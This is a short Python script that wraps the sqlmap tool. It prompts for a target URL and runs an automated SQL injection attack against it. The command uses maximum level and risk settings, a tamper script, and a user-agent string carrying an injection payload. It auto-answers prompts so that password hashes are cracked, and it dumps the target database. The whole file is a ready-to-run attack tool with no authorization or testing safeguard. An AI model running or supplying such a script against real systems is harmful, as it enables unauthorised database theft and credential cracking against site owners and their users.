#!/usr/bin/python
import os
import sys

def run():
    try:
        print("Your sqlmap env path, FOR EXAMPLE: (X:\\where\\your_path_to_sqlmap\\sqlmap.py)...\n")
        env = "X:\\where\\your_path_to_sqlmap\\sqlmap.py"

        print("Your URL parameter for testing....\n")
        url = input("Enter URL: ").strip()

        if not url:
            print("[-] No URL provided. Exiting.")
            return

        cmd = (
            f'python "{env}" -u "{url}" '
            '--tamper=space2comment '
            '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3697127327\' or 9527=9527--" '
            '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
            '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
        )

        os.system(cmd)

        user_input = input("\nDo you want to exit? (yes/no): ").strip().lower()
        if user_input == 'yes':
            print("Goodbye!")
            sys.exit(0)
        else:
            print("Returning to menu...")

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Exiting.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
